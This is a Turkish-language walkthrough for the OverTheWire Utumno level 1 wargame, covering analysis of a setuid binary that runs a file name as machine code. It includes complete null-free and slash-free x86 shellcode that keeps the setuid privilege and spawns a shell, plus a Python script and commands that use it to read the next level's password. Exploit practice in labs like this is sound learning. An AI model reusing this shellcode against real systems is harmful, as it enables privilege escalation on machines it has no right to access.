# OverTheWire — Utumno Level 1 Çözümü (utumno1 → utumno2)

> Hedef: `utumno1` kullanıcısından `utumno2` kullanıcısının şifresini elde etmek.
> Teknik: setuid binary'de **kasıtlı shellcode çalıştırma** (RWX buffer + dönüş adresi ezme).

---

## 1. Bağlantı

```bash
ssh utumno1@utumno.labs.overthewire.org -p 2227
# şifre: ........   (bir önceki seviyeden)
```

---

## 2. Keşif (Recon)

```bash
ls -la /utumno/utumno1
# -r-sr-x--- 1 utumno2 utumno1 13608 utumno1   <-- SUID utumno2, grup utumno1 = OKUNABİLİR
file /utumno/utumno1
# setuid ELF 32-bit LSB, dynamically linked, with debug_info, not stripped
```

**Önemli:** Bu binary bizim (grup utumno1) için `r-x` → **okuyabiliyoruz**, yani statik
analiz (objdump/strings/gdb) mümkün. Çalıştırınca utumno2 yetkisiyle çalışıyor (suid).

### strings — ipuçları
```bash
strings /utumno/utumno1 | grep -viE "GLIBC|GCC|__"
```
Dikkat çekenler: `opendir`, `readdir`, `mmap`, `strncpy`, `strncmp`, `argv`, `argc`
→ Bir **dizini** okuyup içindeki dosya adlarıyla bir şey yapıyor.

Argümansız çalıştırınca `exit=1` (argv[1] gerekiyor).

---

## 3. Statik Analiz — `main`

```bash
objdump -d -M intel /utumno/utumno1 | sed -n '/<main>:/,/^$/p'
```

Sözde kod (decompile):
```c
int main(int argc, char **argv) {
    if (argv[1] == NULL) exit(1);
    buf = mmap(NULL, 0x1000, PROT_READ|WRITE|EXEC, MAP_PRIVATE|ANON, -1, 0); // RWX!
    global_buf = buf;                       // ds:0x804b22c
    if (buf == NULL) exit(2);
    DIR *d = opendir(argv[1]);              // argv[1] = bir DİZİN
    if (d == NULL) exit(1);
    while ((entry = readdir(d)) != NULL) {
        // d_name = entry + 0xb  (dirent: d_ino+d_off+d_reclen+d_type = 11 bayt offset)
        if (strncmp("sh_", entry->d_name, 3) == 0)   // .rodata @0x804a008 = "sh_"
            run(entry->d_name + 3);                  // "sh_" SONRASINI run'a yolla
    }
    return 0;
}
```

`.rodata` doğrulama:
```bash
objdump -s -j .rodata /utumno/utumno1
# 804a000  03000000 01000200 73685f00   ........sh_.
#                              ^^^^^^ "sh_\0"  (@0x804a008)
```

---

## 4. Statik Analiz — `run()` (ASIL ZAFİYET)

```bash
objdump -d -M intel /utumno/utumno1 | sed -n '/<run>:/,/^$/p'
```

Sözde kod:
```c
void run(char *arg) {
    strncpy(global_buf, arg, 0x1000);   // arg'ı RWX buffer'a kopyala
    *(ebp + 4) = global_buf;            // <<< KENDİ DÖNÜŞ ADRESİNİ buffer'a yazıyor!
    // stack canary kontrolü (intact, çünkü taşma yok)
    return;   // ret -> EIP = global_buf -> arg'ı MAKİNE KODU olarak çalıştırır
}
```

> Yani: `sh_` ile başlayan bir dosya adının `sh_` sonrası kısmı, RWX belleğe kopyalanıp
> **shellcode olarak çalıştırılıyor** — ve binary suid olduğu için **utumno2** yetkisiyle.

**Plan:** Adı `sh_<shellcode>` olan bir dosya içeren dizini argv[1] olarak ver.

---

## 5. Kısıtlar ve Shellcode

Dosya adı (filename) iki bayt **içeremez**:
- `/` (0x2f) — yol ayıracı
- `\0` (0x00) — string sonu (ayrıca strncpy de null'da durur)

Bu yüzden **null-free + slash-free** 32-bit shellcode lazım. `"/bin/sh"` string'ini
literal yazmak yerine **`XOR 0x01010101`** ile runtime'da kurdum. Ayrıca suid yetkisinin
shell'e taşınması için `setreuid(euid, euid)` ekledim.

```
; setreuid(geteuid(), geteuid())
xor eax,eax ; mov al,201 ; int 0x80     ; geteuid32 -> eax = euid (utumno2)
mov ebx,eax ; mov ecx,eax
xor eax,eax ; mov al,203 ; int 0x80     ; setreuid32(euid,euid)

; execve("/bin/sh", ["/bin/sh", NULL], NULL)   -- slash-free
xor eax,eax ; push eax                  ; string NUL sonlandırıcı
mov eax,0x0169722e ; xor eax,0x01010101 ; push eax   ; -> 0x0068732f = "/sh\0"
mov eax,0x6f68632e ; xor eax,0x01010101 ; push eax   ; -> 0x6e69622f = "/bin"
mov ebx,esp                             ; ebx -> "/bin/sh"
xor eax,eax ; push eax ; push ebx ; mov ecx,esp   ; ecx -> ["/bin/sh", NULL]
xor edx,edx                             ; envp = NULL
xor eax,eax ; mov al,11 ; int 0x80      ; execve
```

XOR mantığı (örnek `"/sh\0"`): hedef baytlar `2f 73 68 00` = LE dword `0x0068732f`.
`0x0068732f ^ 0x01010101 = 0x0169722e` (bayt: `2e 72 69 01` — ne `/` ne `\0` var). ✓

### Exploit script (Python ile dosyayı oluştur)
```python
import os
sc = bytes([
 0x31,0xc0,0xb0,0xc9,0xcd,0x80,0x89,0xc3,0x89,0xc1,0x31,0xc0,0xb0,0xcb,0xcd,0x80,
 0x31,0xc0,0x50,0xb8,0x2e,0x72,0x69,0x01,0x35,0x01,0x01,0x01,0x01,0x50,
 0xb8,0x2e,0x63,0x68,0x6f,0x35,0x01,0x01,0x01,0x01,0x50,0x89,0xe3,
 0x31,0xc0,0x50,0x53,0x89,0xe1,0x31,0xd2,0x31,0xc0,0xb0,0x0b,0xcd,0x80])
assert 0 not in sc and 0x2f not in sc          # badchar kontrolü
name = b"sh_" + sc
fd = os.open(b"dir/"+name, os.O_CREAT|os.O_WRONLY, 0o644); os.close(fd)
```

### Çalıştırma
```bash
W=$(mktemp -d); chmod 755 "$W"; cd "$W"; mkdir dir; chmod 755 dir
python3 olustur.py                # yukarıdaki dosyayı dir/ içine yaratır
echo "id; cat /etc/utumno_pass/utumno2" | /utumno/utumno1 "$PWD/dir"
```

Çıktı:
```
uid=16002(utumno2) gid=16001(utumno1) groups=16001(utumno1)
```

---

## 6. Debugging Yolculuğu — Karşılaşılan 3 Bug

İlk denemelerde shell açılmadı. Sırayla çözülen 3 sorun:

### Bug 1 — Bozuk execve syscall numarası → SIGSEGV `0xffffffda`
`strace` ile görüldü: `--- SIGSEGV si_addr=0xffffffda ---` (0xffffffda = -38 = ENOSYS).
Sebep: `mov al,0x0b` sadece `eax`'in **alt baytını** set ediyor; üst baytlar bir önceki
`"/bin"` değerinden (`0x6e6962..`) kalmıştı → syscall no = `0x6e69620b` (geçersiz) → ENOSYS
→ ardından gelen null baytlar (`add [eax],al`, eax=0xffffffda) → segfault.
**Düzeltme:** `execve`'den önce `xor eax,eax` ile `eax`'i tamamen temizle.
(geteuid/setreuid'de zaten `xor eax,eax` vardı, sadece execve'de eksikti.)

### Bug 2 — `argv = NULL` ile dash başlamıyor
İlk shellcode `execve("/bin/sh", NULL, NULL)` çağırıyordu; dash `argv[0]` NULL olunca düzgün
çalışmadı. **Düzeltme:** stack'te `["/bin/sh", NULL]` dizisi kurup `ecx`'i ona işaret ettir.

### Bug 3 — `opendir` izin hatası (en sinsi olanı)
Gerçek suid çalışmada `rc=1` dönüyordu (segfault değil!). `main`'de `exit(1)` =
`opendir(argv[1]) == NULL`. Sebep: `mktemp -d` dizini **700 / utumno1** sahipliğindeydi;
suid çalışmada euid=**utumno2** o dizine **giremiyordu** (search/x izni yok) → `opendir`
patlıyordu.
> İpucu neden gizlendi: `strace` altında suid **düşürülür** (kernel güvenliği), process
> utumno1 olarak çalışır ve kendi 700 dizinine girebilir → "strace'de çalışıyor ama gerçekte
> çalışmıyor" yanılgısı. `rc=1` (≠139 segfault) bunu ele verdi.

**Düzeltme:** Çalışma dizinini utumno2'nin geçebilmesi için `chmod 755 "$W"`.

| Belirti | Gerçek sebep | Düzeltme |
|---------|--------------|----------|
| SIGSEGV @0xffffffda | execve syscall no bozuk (al only) | execve öncesi `xor eax,eax` |
| Shell sessizce çıkıyor | `argv=NULL` | argv `["/bin/sh",NULL]` |
| `rc=1`, run() hiç çalışmıyor | suid euid, 700 dizine giremiyor | `chmod 755` çalışma dizini |

---


## Özet / Alınan Dersler

| Konu | Not |
|------|-----|
| **Kasıtlı shellcode exec** | Binary, dosya adını RWX belleğe kopyalayıp kendi ret adresini oraya yazarak çalıştırıyor |
| **Badchar kaçınma** | Filename `/` ve `\0` içeremez → string'i `XOR` ile runtime'da kur |
| **suid privilege koruma** | `execve` öncesi `setreuid(euid,euid)` ile yetkiyi shell'e taşı |
| **strace vs gerçek** | strace setuid'i düşürür; suid'e özgü izin/yetki buglarını gizleyebilir → `rc` değerine bak |
| **`mov al, x` tuzağı** | 8-bit yazma üst baytları temizlemez; syscall no için tam `eax` gerekir |
| **Dizin geçiş izni** | suid binary'ye verilen yol, binary'nin euid'i tarafından erişilebilir olmalı |
